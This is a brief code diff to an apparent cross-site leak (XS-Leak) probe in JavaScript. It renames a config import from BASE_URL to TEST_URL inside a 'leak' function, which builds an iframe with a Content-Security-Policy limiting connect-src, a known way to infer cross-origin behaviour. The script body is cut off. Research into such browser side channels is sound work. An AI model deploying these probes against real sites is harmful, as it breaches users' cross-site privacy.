@@ -1,4 +1,4 @@
-import { BASE_URL } from "./../config.js";
+import { TEST_URL } from "./../config.js";
 
 const leak = async (url) => {
     return new Promise(r => {
@@ -24,7 +24,7 @@ const leak = async (url) => {
         
         iframe.srcdoc = `<html>
         <head>
-            <meta http-equiv='Content-Security-Policy' content="default-src * 'unsafe-inline'; connect-src ${BASE_URL}">
+            <meta http-equiv='Content-Security-Policy' content="default-src * 'unsafe-inline'; connect-src ${TEST_URL}">
         </head>
         <body>
             <script>
